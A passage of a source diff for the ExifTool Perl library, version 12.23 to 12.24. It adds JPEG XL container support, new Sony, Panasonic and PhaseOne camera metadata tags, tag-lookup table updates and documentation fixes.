+    return 0 unless $raf->Read($hdr,12) == 12;
+    if ($hdr eq "\0\0\0\x0cJXL \x0d\x0a\x87\x0a") {
+        # JPEG XL in ISO BMFF container
+        $$et{IsJXL} = 1;
+    } elsif ($hdr =~ /^\xff\x0a/) {
+        # JPEG XL codestream
+        if ($outfile) {
+            if ($$et{OPTIONS}{IgnoreMinorErrors}) {
+                $et->Warn('Wrapped JXL codestream in ISO BMFF container');
+            } else {
+                $et->Error('Will wrap JXL codestream in ISO BMFF container for writing',1);
+                return 0;
+            }
+            $$et{IsJXL} = 2;
+            my $buff = "\0\0\0\x0cJXL \x0d\x0a\x87\x0a\0\0\0\x14ftypjxl \0\0\0\0jxl ";
+            # add metadata to empty ISO BMFF container
+            $$dirInfo{RAF} = new File::RandomAccess(\$buff);
+        } else {
+            $et->Warn('JPEG XL codestream support is currently experimental',1);
+            $et->SetFileType('JXL Codestream','image/jxl', 'jxl');
+            return ProcessJXLCodestream($et, \$hdr);
+        }
+    } else {
+        return 0;
+    }
+    $raf->Seek(0,0) or $et->Error('Seek error'), return 0;
+    $et->Warn('JPEG XL support is currently experimental',1);
+
+    my $success = ProcessJP2($et, $dirInfo);
+
+    if ($outfile and $success > 0 and $$et{IsJXL} == 2) {
+        # attach the JXL codestream box to the ISO BMFF file
+        $raf->Seek(0,2) or return -1;
+        my $size = $raf->Tell();
+        $raf->Seek(0,0) or return -1;
+        SetByteOrder('MM');
+        Write($outfile, Set32u($size + 8), 'jxlc') or return -1;
+        while ($raf->Read($buff, 65536)) {
+            Write($outfile, $buff) or return -1;
+        }
+    }
+    return $success;
 }
 
 1;  # end

diff -u -r -N exiftool-12.23/lib/Image/ExifTool/MacOS.pm exiftool-12.24/lib/Image/ExifTool/MacOS.pm
--- exiftool-12.23/lib/Image/ExifTool/MacOS.pm	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/lib/Image/ExifTool/MacOS.pm	2021-04-13 15:11:46.000000000 +0000
@@ -245,7 +245,7 @@
         XAttr tags are extracted using the "xattr" utility.  They are extracted if
         any "XAttr*" tag or the MacOS group is specifically requested, or by setting
         the L<XAttrTags|../ExifTool.html#XAttrTags> API option to 1 or the L<RequestAll|../ExifTool.html#RequestAll> API option to 2 or higher.
-        And they extracted by default from MacOS "._" files when reading
+        And they are extracted by default from MacOS "._" files when reading
         these files directly.
     },
     'com.apple.FinderInfo' => {

diff -u -r -N exiftool-12.23/lib/Image/ExifTool/Microsoft.pm exiftool-12.24/lib/Image/ExifTool/Microsoft.pm
--- exiftool-12.23/lib/Image/ExifTool/Microsoft.pm	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/lib/Image/ExifTool/Microsoft.pm	2021-04-13 15:11:46.000000000 +0000
@@ -889,12 +889,14 @@
         } elsif ($format eq 'date') {
             $dat = Image::ExifTool::GetUnixTime($val, 1);   # (convert to UTC, NC)
             if ($dat) {
+                # 100ns intervals since Jan 1, 1601
                 $dat = Set64u(($dat + 11644473600) * 1e7);
                 $type = 21;
             }
-        } elsif ($format eq 'vt_filetime') {
+        } elsif ($format eq 'vt_filetime') { # 'date' value inside a VT_VARIANT
             $dat = Image::ExifTool::GetUnixTime($val);  # (leave as local time, NC)
             if ($dat) {
+                # 100ns intervals since Jan 1, 1601
                 $dat = Set32u(64) . Set64u(($dat + 11644473600) * 1e7);
                 $type = 65;
             }

diff -u -r -N exiftool-12.23/lib/Image/ExifTool/Panasonic.pm exiftool-12.24/lib/Image/ExifTool/Panasonic.pm
--- exiftool-12.23/lib/Image/ExifTool/Panasonic.pm	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/lib/Image/ExifTool/Panasonic.pm	2021-04-13 15:11:46.000000000 +0000
@@ -2118,6 +2118,7 @@
         Name => 'UserProfile',
         Writable => 'string',
     },
+    # 0x357 int32u - 0=DNG, 3162=JPG (ref 23)
     0x359 => { #23
         Name => 'ISOSelected',
         Writable => 'int32s',
@@ -2134,7 +2135,19 @@
         PrintConv => 'sprintf("%.1f", $val)',
         PrintConvInv => '$val',
     },
-    # 0x357 int32u - 0=DNG, 3162=JPG (ref 23)
+    0x035b => { #IB
+        Name => 'CorrelatedColorTemp', # (in Kelvin)
+        Writable => 'int16u',
+    },
+    0x035c => { #IB
+        Name => 'ColorTint', # (same units as Adobe is using)
+        Writable => 'int16s',
+    },
+    0x035d => { #IB
+        Name => 'WhitePoint', # (x/y)
+        Writable => 'rational64u',
+        Count => 2,
+    },
 );
 
 # Type 2 tags (ref PH)

diff -u -r -N exiftool-12.23/lib/Image/ExifTool/PhaseOne.pm exiftool-12.24/lib/Image/ExifTool/PhaseOne.pm
--- exiftool-12.23/lib/Image/ExifTool/PhaseOne.pm	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/lib/Image/ExifTool/PhaseOne.pm	2021-04-13 15:11:46.000000000 +0000
@@ -15,7 +15,7 @@
 use Image::ExifTool qw(:DataAccess :Utils);
 use Image::ExifTool::Exif;
 
-$VERSION = '1.06';
+$VERSION = '1.07';
 
 sub WritePhaseOne($$$);
 sub ProcessPhaseOne($$$);
@@ -73,10 +73,11 @@
         PrintConv => { #PH
             1 => 'RAW 1', #? (encrypted)
             2 => 'RAW 2', #? (encrypted)
-            3 => 'IIQ L',
+            3 => 'IIQ L', # (now "L14", ref IB)
             # 4?
             5 => 'IIQ S',
-            6 => 'IIQ Sv2',
+            6 => 'IIQ Sv2', # (now "S14" for "IIQ 14 Smart" and "IIQ 14 Sensor+", ref IB)
+            8 => 'IIQ L16', #IB ("IIQ 16 Extended" and "IIQ 16 Large")
         },
     },
     0x010f => {

diff -u -r -N exiftool-12.23/lib/Image/ExifTool/Sony.pm exiftool-12.24/lib/Image/ExifTool/Sony.pm
--- exiftool-12.23/lib/Image/ExifTool/Sony.pm	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/lib/Image/ExifTool/Sony.pm	2021-04-13 15:11:46.000000000 +0000
@@ -34,7 +34,7 @@
 use Image::ExifTool::Exif;
 use Image::ExifTool::Minolta;
 
-$VERSION = '3.39';
+$VERSION = '3.40';
 
 sub ProcessSRF($$$);
 sub ProcessSR2($$$);
@@ -633,9 +633,10 @@
             3 => 'Standard',
             4 => 'Economy',
             5 => 'Extra Fine',
-            6 => 'RAW + JPEG',
+            6 => 'RAW + JPEG/HEIF',
             7 => 'Compressed RAW',
             8 => 'Compressed RAW + JPEG',
+            9 => 'Light', #JR
             0xffffffff => 'n/a', #PH (SLT-A57 panorama)
         },
     },
@@ -1179,7 +1180,7 @@
         # doesn't seem to apply to DSC models (always 0)
         Name => 'AFPointSelected',
         Condition => q{
-            ($$self{Model} =~ /^(SLT-|HV)/) or ($$self{Model} =~ /^ILCE-/ and
+            ($$self{Model} =~ /^(SLT-|HV)/) or ($$self{Model} =~ /^(ILCE-|ILME-)/ and
             defined $$self{AFAreaILCE} and  $$self{AFAreaILCE} == 4)
         },
         Notes => 'SLT models or ILCE with LA-EA2/EA4',
@@ -1462,13 +1463,15 @@
         Count => 2,
         PrintConv => {
             '0 0' => 'n/a',
-            '0 1' => 'Standard JPEG',
-            '0 2' => 'Fine JPEG',
-            '0 3' => 'Extra Fine JPEG',
+            '0 1' => 'Standard',
+            '0 2' => 'Fine',
+            '0 3' => 'Extra Fine',
+            '0 4' => 'Light', #JR
             '1 0' => 'RAW',
-            '1 1' => 'RAW + Standard JPEG',
-            '1 2' => 'RAW + Fine JPEG',
-            '1 3' => 'RAW + Extra Fine JPEG',
+            '1 1' => 'RAW + Standard',
+            '1 2' => 'RAW + Fine',
+            '1 3' => 'RAW + Extra Fine',
+            '1 4' => 'RAW + Light', #JR
         },
     },
     0x202f => { #JR (ILCE-7RM3)
@@ -1514,13 +1517,56 @@
         PrintConv => 'sprintf("%.8d",$val)',
         PrintConvInv => '$val',
     },
-# 0x2032 - first seen for ILCE-7SM3, July 2020
-# 0x2033 - first seen for ILCE-7SM3, July 2020
-# 0x2034 - first seen for ILCE-7SM3, July 2020
-# 0x2035 - first seen for ILCE-7SM3, July 2020
-# 0x2036 - first seen for ILCE-7SM3, July 2020
-# 0x2037 - first seen for ILCE-7SM3, July 2020
-# 0x2039 - first seen for ILCE-7SM3, July 2020
+# 0x2032 - 0x2039: from July 2020 for ILCE-7SM3, ILCE-1, ILME-FX3 and newer
+    0x2032 => {
+        Name => 'Shadows',
+        Writable => 'int32s',
+        PrintConv => '$val > 0 ? "+$val" : $val',
+        PrintConvInv => '$val',
+    },
+    0x2033 => {
+        Name => 'Highlights',
+        Writable => 'int32s',
+        PrintConv => '$val > 0 ? "+$val" : $val',
+        PrintConvInv => '$val',
+    },
+    0x2034 => {
+        Name => 'Fade',
+        Writable => 'int32s',
+        PrintConv => '$val > 0 ? "+$val" : $val',
+        PrintConvInv => '$val',
+    },
+    0x2035 => {
+        Name => 'SharpnessRange',
+        Writable => 'int32s',
+        PrintConv => '$val > 0 ? "+$val" : $val',
+        PrintConvInv => '$val',
+    },
+    0x2036 => {
+        Name => 'Clarity',
+        Writable => 'int32s',
+        PrintConv => '$val > 0 ? "+$val" : $val',
+        PrintConvInv => '$val',
+    },
+    0x2037 => {
+        Name => 'FocusFrameSize',
+        Format => 'int16u',
+        Count => '3',
+        PrintConv => q{
+            my @a = split ' ', $val;
+            return $a[2] ? sprintf('%3dx%3d', $a[0], $a[1]) : 'n/a';
+        },
+        PrintConvInv => '$val =~ /(\d+)x(\d+)/ ? "$1 $2 257" : "0 0 0"',
+    },
+    0x2039 => { #JR
+        Name => 'JPEG-HEIFSwitch', # (name used in camera menus)
+        Writable => 'int16u',
+        PrintConv => {
+            0 => 'JPEG',
+            1 => 'HEIF',
+            65535 => 'n/a',
+        },
+    },
     0x3000 => {
         Name => 'ShotInfo',
         SubDirectory => { TagTable => 'Image::ExifTool::Sony::ShotInfo' },
@@ -1583,7 +1629,7 @@
     # 0x24 (e) for ILCA-99M2,ILCE-5100/6300/6500/7M2/7RM2/7S/7SM2/QX1, DSC-HX80/HX90V/QX30/RX0/RX100M3/RX100M4/RX100M5/RX10M2/RX10M3/RX1RM2/WX500
     # 0x26 (e) for ILCE-6100/6400/6600/7M3/7RM3/9, DSC-RX0M2/RX10M4/RX100M5A/RX100M6/HX99
     # 0x28 (e) for ILCE-7RM4/9M2, DSC-RX100M7, ZV-1
-    # 0x31 (e) for ILCE-1, 7SM3
+    # 0x31 (e) for ILCE-1/7SM3, ILME-FX3
     # first byte decoded: 40, 204, 202, 27, 58, 62, 48, 215, 28, 106 respectively
     {
         Name => 'Tag9400a',
@@ -6080,6 +6126,9 @@
         31 => 'Gamma S-Log3 (PP8 or PP9)', #14
         33 => 'Gamma HLG2 (PP10)', #14
         34 => 'Gamma HLG3', #IB
+        37 => 'FL',
+        39 => 'IN',
+        40 => 'SH',
     },
 );
 my %isoSetting2010 = (
@@ -7801,7 +7850,7 @@
     CHECK_PROC => \&Image::ExifTool::CheckBinaryData,
     FORMAT => 'int8u',
     NOTES => q{
-        Valid from July 2020 for ILCE-1/7SM3.
+        Valid from July 2020 for ILCE-1/7SM3, ILME-FX3.
     },
     WRITABLE => 1,
     FIRST_ENTRY => 0,
@@ -7888,6 +7937,13 @@
     },
     0x0088 => {
         Name => 'InternalSerialNumber', #(NC)
+        Condition => '$$self{Model} =~ /^(ILCE-7SM3|ILME-FX3)/',
+        Format => 'int8u[6]',
+        PrintConv => 'unpack "H*", pack "C*", split " ", $val',
+    },
+    0x008a => {
+        Name => 'InternalSerialNumber', #(NC)
+        Condition => '$$self{Model} =~ /^(ILCE-1)/',
         Format => 'int8u[6]',
         PrintConv => 'unpack "H*", pack "C*", split " ", $val',
     },
@@ -8117,7 +8173,7 @@
             8 => 'Rotate 270 CW',
         },
     },
-    0x002a => {
+    0x002a => [{
         Name => 'Quality2',
         Condition => '$$self{Model} !~ /^(ILCE-(1|7SM3)|ILME-FX3)\b/',
         PrintConv => {
@@ -8126,7 +8182,17 @@
             2 => 'RAW + JPEG',
             3 => 'JPEG + MPO', # 3D images
         },
-    },
+    },{
+        Name => 'Quality2',
+        Condition => '$$self{Model} =~ /^(ILCE-(1|7SM3)|ILME-FX3)\b/',
+        PrintConv => {
+            1 => 'JPEG',
+            2 => 'RAW',
+            3 => 'RAW + JPEG',
+            4 => 'HEIF',
+            6 => 'RAW + HEIF',
+        },
+    }],
     0x0047 => {
         Name => 'SonyImageHeight',
         Condition => '$$self{Model} !~ /^(ILCE-(1|7SM3)|ILME-FX3)\b/',
@@ -8795,7 +8861,7 @@
     FIRST_ENTRY => 0,
     GROUPS => { 0 => 'MakerNotes', 2 => 'Image' },
     DATAMEMBER => [ 0x0008 ],
-    NOTES => 'NEX and ILCE models only.',
+    NOTES => 'E-mount cameras only.',
 
     # 0x0001 - 0 for all NEX and ILCE-3000/3500, 20 for all other ILCE (17 for ILCE samples from Sony.net)
     # 0x0008 - LensMount, but different values from Tag9405-0x0105 and Tag9050-0x0604.
@@ -9422,7 +9488,7 @@
     WRITE_PROC => \&WriteEnciphered,
     CHECK_PROC => \&Image::ExifTool::CheckBinaryData,
     FORMAT => 'int8u',
-    NOTES => 'Valid for the ILCE-1/7SM3.',
+    NOTES => 'Valid for the ILCE-1/7SM3, ILME-FX3.',
     FIRST_ENTRY => 0,
     GROUPS => { 0 => 'MakerNotes', 2 => 'Image' },
     0x0000 => { Name => 'Tag9416_0000', PrintConv => 'sprintf("%3d",$val)', RawConv => '$$self{TagVersion} = $val' },

diff -u -r -N exiftool-12.23/lib/Image/ExifTool/TagLookup.pm exiftool-12.24/lib/Image/ExifTool/TagLookup.pm
--- exiftool-12.23/lib/Image/ExifTool/TagLookup.pm	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/lib/Image/ExifTool/TagLookup.pm	2021-04-13 15:11:46.000000000 +0000
@@ -631,9 +631,9 @@
 	'afaperture' => { 215 => 0x5, 216 => 0x5, 220 => 0x5 },
 	'afareaheight' => { 190 => [0x1a,0x34,0x50] },
 	'afareaillumination' => { 181 => 0x4b, 282 => '15.3' },
-	'afareamode' => { 124 => '0.2', 177 => 0x33, 181 => 0xe, 189 => 0x0, 190 => 0x5, 311 => 0xf, 378 => 0x1205, 391 => [0xa,0x3a], 398 => 0x11, 399 => 0x10, 400 => 0x24, 411 => 0xb043, 435 => 0x17 },
+	'afareamode' => { 124 => '0.3', 177 => 0x33, 181 => 0xe, 189 => 0x0, 190 => 0x5, 311 => 0xf, 378 => 0x1205, 391 => [0xa,0x3a], 398 => 0x11, 399 => 0x10, 400 => 0x24, 411 => 0xb043, 435 => 0x17 },
 	'afareamodesetting' => { 273 => '11.1', 276 => '0.1', 282 => '16.1', 286 => '2.1', 411 => 0x201c },
-	'afareapointsize' => { 124 => '0.3' },
+	'afareapointsize' => { 124 => '0.4' },
 	'afareas' => { 288 => 0x304 },
 	'afareaselectionmethod' => { 2 => 0xd },
 	'afareaselectmethod' => { 82 => 0x51b },
@@ -642,7 +642,7 @@
 	'afareaxposition1' => { 378 => 0x1201 },
 	'afareayposition' => { 190 => [0x16,0x30,0x4c], 378 => 0x1204 },
 	'afareayposition1' => { 378 => 0x1202 },
-	'afareazonesize' => { 124 => '0.4' },
+	'afareazonesize' => { 124 => '0.5' },
 	'afassist' => { 80 => 0x5, 88 => 0x5, 181 => 0x48, 271 => '2.5', 273 => '0.2', 276 => '0.2', 277 => '1.1', 278 => '1.1', 279 => '1.3', 280 => '2.4', 281 => '1.3', 282 => '0.2', 284 => '2.4', 286 => '2.3' },
 	'afassistbeam' => { 2 => 0x8, 82 => 0x50e, 83 => 0x4, 84 => 0x5, 85 => 0x4, 86 => 0x4, 87 => 0x5 },
 	'afassistlamp' => { 311 => 0x31 },
@@ -1453,7 +1453,7 @@
 	'circulargradientbasedcorrections' => { 468 => 'CircularGradientBasedCorrections', 470 => 'CircularGradientBasedCorrections' },
 	'city' => { 129 => 0x5a, 158 => 'City', 311 => 0x6d, 482 => 'City' },
 	'city2' => { 311 => 0x80 },
-	'clarity' => { 225 => 0x35, 226 => 0x3d, 468 => 'Clarity', 470 => 'Clarity' },
+	'clarity' => { 225 => 0x35, 226 => 0x3d, 411 => 0x2036, 468 => 'Clarity', 470 => 'Clarity' },
 	'clarity2012' => { 468 => 'Clarity2012', 470 => 'Clarity2012' },
 	'claritycontrol' => { 346 => 0x96 },
 	'classifystate' => { 129 => 0xe1 },
@@ -1620,6 +1620,7 @@
 	'colortempunknown7' => { 38 => 0x54, 39 => 0x87, 41 => 0x86, 42 => 0x67, 46 => 0x93, 47 => 0x70, 48 => 0x70, 49 => 0x78 },
 	'colortempunknown8' => { 38 => 0x59, 39 => 0x8f, 41 => 0x8b, 42 => 0x6c, 46 => 0x98, 47 => 0x75, 48 => 0x75, 49 => 0x7d },
 	'colortempunknown9' => { 38 => 0x5e, 39 => 0x97, 41 => 0x90, 42 => 0x71, 46 => 0x9d, 47 => 0x7a, 48 => 0x7a, 49 => 0x82 },
+	'colortint' => { 310 => 0x35c },
 	'colortone' => { 10 => 0x6f, 12 => 0x77, 34 => 0x2a, 50 => 0x2 },
 	'colortoneadj' => { 101 => 0x20304, 106 => 0x11e },
 	'colortoneauto' => { 69 => 0x9c },
@@ -1786,6 +1787,7 @@
 	'coringfilter' => { 292 => 0x310, 293 => 0x102d, 296 => 0x310 },
 	'coringvalues' => { 292 => 0x311, 296 => 0x311 },
 	'corporateentity' => { 484 => 'corporateEntity' },
+	'correlatedcolortemp' => { 310 => 0x35b },
 	'country' => { 158 => 'Country', 311 => 0x69, 482 => 'Country' },
 	'country-primarylocationcode' => { 129 => 0x64 },
 	'country-primarylocationname' => { 129 => 0x65 },
@@ -2529,6 +2531,7 @@
 	'facesdetected' => { 53 => 0x2, 54 => 0x2, 55 => 0x3, 108 => 0x0, 109 => 0x2, 111 => 0x211c, 125 => 0x4100, 203 => 0x3, 292 => 0x1200, 311 => 0x3f, 330 => 0x0, 375 => 0xb5, 386 => 0x0, 405 => 0x0, 408 => 0x3, 418 => 0x30 },
 	'facesrecognized' => { 304 => 0x0 },
 	'facewidth' => { 54 => 0x1 },
+	'fade' => { 411 => 0x2034 },
 	'faithfuloutputhighlightpoint' => { 107 => 0x38 },
 	'faithfuloutputshadowpoint' => { 107 => 0x39 },
 	'faithfulrawcolortone' => { 107 => 0x31 },
@@ -3059,7 +3062,7 @@
 	'highlightlinearitylimit' => { 385 => 0xa025 },
 	'highlightprotection' => { 263 => 0x6 },
 	'highlightrecovery' => { 468 => 'HighlightRecovery', 470 => 'HighlightRecovery' },
-	'highlights' => { 462 => 'Highlights' },
+	'highlights' => { 411 => 0x2033, 462 => 'Highlights' },
 	'highlights2012' => { 468 => 'Highlights2012', 470 => 'Highlights2012' },
 	'highlightsadj' => { 445 => 0x9019 },
 	'highlightshadow' => { 311 => 0xad },
@@ -3304,7 +3307,7 @@
 	'internalflashtable' => { 293 => 0x1024 },
 	'internallensserialnumber' => { 385 => 0xa005 },
 	'internalndfilter' => { 311 => 0x9d },
-	'internalserialnumber' => { 62 => 0x96, 74 => 0x9, 125 => 0x10, 184 => 0x49dc, 287 => 0x18, 289 => 0x102, 308 => 0x500, 311 => 0x25, 326 => 0x4, 378 => 0x5, 429 => [0x7c,0xf0], 430 => 0x88, 431 => 0x88 },
+	'internalserialnumber' => { 62 => 0x96, 74 => 0x9, 125 => 0x10, 184 => 0x49dc, 287 => 0x18, 289 => 0x102, 308 => 0x500, 311 => 0x25, 326 => 0x4, 378 => 0x5, 429 => [0x7c,0xf0], 430 => 0x88, 431 => [0x88,0x8a] },
 	'interopindex' => { 117 => 0x1, 475 => 'InteroperabilityIndex' },
 	'interopversion' => { 117 => 0x2 },
 	'intervallength' => { 178 => 0x10 },
@@ -3374,6 +3377,7 @@
 	'jobrefname' => { 493 => [\'JobRef','JobRefName'] },
 	'jobrefurl' => { 493 => [\'JobRef','JobRefUrl'] },
 	'jobstatus' => { 476 => 'JobStatus' },
+	'jpeg-heifswitch' => { 411 => 0x2039 },
 	'jpeghandling' => { 468 => 'JPEGHandling', 470 => 'JPEGHandling' },
 	'jpegquality' => { 10 => 0x66, 311 => 0x43, 313 => 0x3034, 411 => 0xb047 },
 	'jpegsize' => { 313 => 0x303a },
@@ -4655,7 +4659,9 @@
 	'pixelcorrectionscale' => { 135 => 0x971 },
 	'pixelscale' => { 117 => 0x830e },
 	'pixelshiftinfo' => { 411 => 0x202f },
+	'pixelshiftoffset' => { 125 => 0x1106 },
 	'pixelshiftresolution' => { 347 => 0x0 },
+	'pixelshiftshots' => { 125 => 0x1105 },
 	'pixelsperunitx' => { 300 => 0x0 },
 	'pixelsperunity' => { 300 => 0x4 },
 	'pixelunits' => { 300 => 0x8 },
@@ -4746,6 +4752,7 @@
 	'potentialface8position' => { 408 => 0x51 },
 	'powersource' => { 325 => '0.1' },
 	'poweruptime' => { 222 => 0xb6 },
+	'preaf' => { 124 => '0.2' },
 	'precaptureframes' => { 293 => 0x300 },
 	'predictor' => { 117 => 0x13d },
 	'preflashreturnstrength' => { 238 => 0x28a },
@@ -5351,7 +5358,7 @@
 	'shadowadj' => { 101 => 0x2030b },
 	'shadowcorrection' => { 346 => 0x79 },
 	'shadowprotection' => { 263 => 0x0 },
-	'shadows' => { 117 => 0xfe52, 462 => 'Shadows', 468 => 'Shadows', 470 => 'Shadows' },
+	'shadows' => { 117 => 0xfe52, 411 => 0x2032, 462 => 'Shadows', 468 => 'Shadows', 470 => 'Shadows' },
 	'shadows2012' => { 468 => 'Shadows2012', 470 => 'Shadows2012' },
 	'shadowsadj' => { 445 => 0x901a },
 	'shadowscale' => { 117 => 0xc633 },
@@ -5377,6 +5384,7 @@
 	'sharpnessneutral' => { 19 => 0xf4, 68 => 0x4c, 69 => 0x4c },
 	'sharpnessovershoot' => { 445 => 0x801b },
 	'sharpnessportrait' => { 19 => 0xf2, 68 => 0x1c, 69 => 0x1c },
+	'sharpnessrange' => { 411 => 0x2035 },
 	'sharpnesssetting' => { 288 => 0x506, 296 => 0x1013, 400 => 0x12, 416 => 0xa },
 	'sharpnessstandard' => { 19 => 0xf1, 68 => 0x4, 69 => 0x4 },
 	'sharpnessstrength' => { 101 => 0x20311 },
@@ -6354,7 +6362,7 @@
 	'whitebalancetemperature' => { 288 => 0x501 },
 	'whiteboard' => { 293 => 0x301 },
 	'whitelevel' => { 117 => 0xc61d, 346 => 0x7e },
-	'whitepoint' => { 117 => 0x13e, 346 => 0x201, 490 => 'WhitePoint' },
+	'whitepoint' => { 117 => 0x13e, 310 => 0x35d, 346 => 0x201, 490 => 'WhitePoint' },
 	'whites2012' => { 468 => 'Whites2012', 470 => 'Whites2012' },
 	'whitesadj' => { 445 => 0x9017 },
 	'wideadapter' => { 378 => 0x1017 },
@@ -8117,6 +8125,7 @@
 	'focalrange' => 1,
 	'focusdistance2' => 1,
 	'focusedgemap' => 1,
+	'focusframesize' => 1,
 	'focusinfo' => 1,
 	'focusinfoifd' => 1,
 	'focuspeakinghighlightcolor' => 1,
@@ -8703,10 +8712,11 @@
 	'jumbf' => 1,
 	'jumbfbox' => 1,
 	'jumbfdescr' => 1,
-	'jumbfid' => 1,
-	'jumbflabel' => 1,
-	'jumbfsignature' => 1,
-	'jumbftype' => 1,
+	'jumdflags' => 1,
+	'jumdid' => 1,
+	'jumdlabel' => 1,
+	'jumdsignature' => 1,
+	'jumdtype' => 1,
 	'jumptoxpep' => 1,
 	'junk' => 1,
 	'jxlcodestream' => 1,

diff -u -r -N exiftool-12.23/lib/Image/ExifTool/TagNames.pod exiftool-12.24/lib/Image/ExifTool/TagNames.pod
--- exiftool-12.23/lib/Image/ExifTool/TagNames.pod	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/lib/Image/ExifTool/TagNames.pod	2021-04-13 15:11:46.000000000 +0000
@@ -12,7 +12,7 @@
 =head1 TAG TABLES
 
 The tables listed below give the names of all tags recognized by ExifTool.
-They contain a total of 24102 tags, with 15604 unique tag names.
+They contain a total of 24118 tags, with 15614 unique tag names.
 
 B<Tag ID>, B<Index#> or B<Sequence> is given in the first column of each
 table.  A B<Tag ID> is the computer-readable equivalent of a tag name, and
@@ -9933,6 +9933,8 @@
   0x1100   AutoBracketing                       int16u
   0x1101   SequenceNumber                       int16u
   0x1103   DriveSettings                        FujiFilm DriveSettings
+  0x1105   PixelShiftShots                      int16u
+  0x1106   PixelShiftOffset                     rational64s[2]
   0x1153   PanoramaAngle                        int16u
   0x1154   PanoramaDirection                    int16u
   0x1201   AdvancedFilter                       int32u
@@ -9989,10 +9991,11 @@
 
   Index4   Tag Name                             Writable
   ------   --------                             --------
-    0.1    FocusMode2                           int32u & 0xff
-    0.2    AFAreaMode                           int32u & 0xf00
-    0.3    AFAreaPointSize                      int32u & 0xf000
-    0.4    AFAreaZoneSize                       int32u & 0xf0000
+    0.1    FocusMode2                           int32u & 0x0f
+    0.2    PreAF                                int32u & 0xf0
+    0.3    AFAreaMode                           int32u & 0xf00
+    0.4    AFAreaPointSize                      int32u & 0xf000
+    0.5    AFAreaZoneSize                       int32u & 0xf0000
 
 =head3 FujiFilm AFCSettings Tags
 
@@ -15802,6 +15805,9 @@
   0x034c   UserProfile                          string
   0x0359   ISOSelected                          int32s
   0x035a   FNumber                              int32s
+  0x035b   CorrelatedColorTemp                  int16u
+  0x035c   ColorTint                            int16s
+  0x035d   WhitePoint                           rational64u[2]
 
 =head3 Panasonic Type2 Tags
 
@@ -17514,6 +17520,13 @@
   0x202e   Quality                              int16u[2]
   0x202f   PixelShiftInfo                       undef
   0x2031   SerialNumber                         string
+  0x2032   Shadows                              int32s
+  0x2033   Highlights                           int32s
+  0x2034   Fade                                 int32s
+  0x2035   SharpnessRange                       int32s
+  0x2036   Clarity                              int32s
+  0x2037   FocusFrameSize                       no
+  0x2039   JPEG-HEIFSwitch                      int16u
   0x3000   ShotInfo                             Sony ShotInfo
   0x900b   Tag900b                              Sony Tag900b
   0x9050   Tag9050a                             Sony Tag9050a
@@ -18600,7 +18613,7 @@
 
 =head3 Sony Tag9050c Tags
 
-Valid from July 2020 for ILCE-1/7SM3.
+Valid from July 2020 for ILCE-1/7SM3, ILME-FX3.
 
   Index1   Tag Name                             Writable
   ------   --------                             --------
@@ -18615,6 +18628,7 @@
     104    SonyFNumber                          int16u
     107    ReleaseMode2                         int8u
     136    InternalSerialNumber                 int8u[6]~
+    138    InternalSerialNumber                 int8u[6]~
 
 =head3 Sony Tag9400a Tags
 
@@ -18816,7 +18830,7 @@
 
 =head3 Sony Tag940c Tags
 
-NEX and ILCE models only.
+E-mount cameras only.
 
   Index1   Tag Name                             Writable
   ------   --------                             --------
@@ -19006,7 +19020,7 @@
 
 =head3 Sony Tag9416 Tags
 
-Valid for the ILCE-1/7SM3.
+Valid for the ILCE-1/7SM3, ILME-FX3.
 
   Index1   Tag Name                             Writable
   ------   --------                             --------
@@ -21877,10 +21891,11 @@
 
   Tag ID               Tag Name                 Writable
   ------               --------                 --------
-  'id'                 JUMBFID                  no
-  'label'              JUMBFLabel               no
-  'signature'          JUMBFSignature           no
-  'type'               JUMBFType                no
+  'jumd-flags'         JUMDFlags                no
+  'jumd-id'            JUMDID                   no
+  'jumd-label'         JUMDLabel                no
+  'jumd-sig'           JUMDSignature            no
+  'jumd-type'          JUMDType                 no
 
 =head3 Jpeg2000 CaptureResolution Tags
 
@@ -34897,7 +34912,7 @@
 XAttr tags are extracted using the "xattr" utility.  They are extracted if
 any "XAttr*" tag or the MacOS group is specifically requested, or by setting
 the XAttrTags API option to 1 or the RequestAll API option to 2 or higher.
-And they extracted by default from MacOS "._" files when reading
+And they are extracted by default from MacOS "._" files when reading
 these files directly.
 
   Tag Name                                      Writable

diff -u -r -N exiftool-12.23/lib/Image/ExifTool/Writer.pl exiftool-12.24/lib/Image/ExifTool/Writer.pl
--- exiftool-12.23/lib/Image/ExifTool/Writer.pl	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/lib/Image/ExifTool/Writer.pl	2021-04-13 15:11:46.000000000 +0000
@@ -105,6 +105,7 @@
     ICC => [ 'ICC_Profile', 'WriteICC' ],
     IND =>   'InDesign',
     JP2 =>   'Jpeg2000',
+    JXL =>   'Jpeg2000',
     MIE =>   undef,
     MOV => [ 'QuickTime',   'WriteMOV' ],
     MRW =>   'MinoltaRaw',

diff -u -r -N exiftool-12.23/lib/Image/ExifTool.pm exiftool-12.24/lib/Image/ExifTool.pm
--- exiftool-12.23/lib/Image/ExifTool.pm	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/lib/Image/ExifTool.pm	2021-04-13 15:11:46.000000000 +0000
@@ -28,7 +28,7 @@
             %mimeType $swapBytes $swapWords $currentByteOrder %unpackStd
             %jpegMarker %specialTags %fileTypeLookup $testLen $exePath);
 
-$VERSION = '12.23';
+$VERSION = '12.24';
 $RELEASE = '';
 @ISA = qw(Exporter);
 %EXPORT_TAGS = (
@@ -189,19 +189,19 @@
                 FLAC APE MPC MKV MXF DV PMP IND PGF ICC ITC FLIR FLIF FPF LFP
                 HTML VRD RTF FITS XCF DSS QTIF FPX PICT ZIP GZIP PLIST RAR BZ2
                 CZI TAR  EXE EXR HDR CHM LNK WMF AVC DEX DPX RAW Font RSRC M2TS
-                MacOS PHP PCX DCX DWF DWG WTV Torrent VCard LRI R3D AA PDB MOI
-                ISO ALIAS JSON MP3 DICOM PCD TXT);
+                MacOS PHP PCX DCX DWF DWG DXF WTV Torrent VCard LRI R3D AA PDB
+                JXL MOI ISO ALIAS JSON MP3 DICOM PCD TXT);
 
 # file types that we can write (edit)
 my @writeTypes = qw(JPEG TIFF GIF CRW MRW ORF RAF RAW PNG MIE PSD XMP PPM EPS
